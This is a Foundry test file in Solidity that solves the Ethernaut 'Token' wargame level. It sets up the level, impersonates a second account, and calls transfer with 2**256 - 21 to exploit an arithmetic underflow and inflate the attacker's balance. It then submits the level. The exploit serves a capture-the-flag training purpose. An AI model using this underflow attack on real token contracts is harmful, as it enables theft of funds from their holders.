pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/Token/TokenFactory.sol";
import "../src/core/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address attacker = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory factory = new TokenFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Token target = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        vm.stopPrank();

        // change accounts from the level was set up with, have to call the transfer function from another acount
        vm.startPrank(address(1));

        emit log_named_uint(
            "player contract balance",
            target.balanceOf(address(attacker))
        );


        target.transfer(attacker, (2**256 - 21));

        emit log_named_uint(
            "player contract balance",
            target.balanceOf(address(attacker))
        );

        vm.stopPrank();
        vm.startPrank(attacker);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////


        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
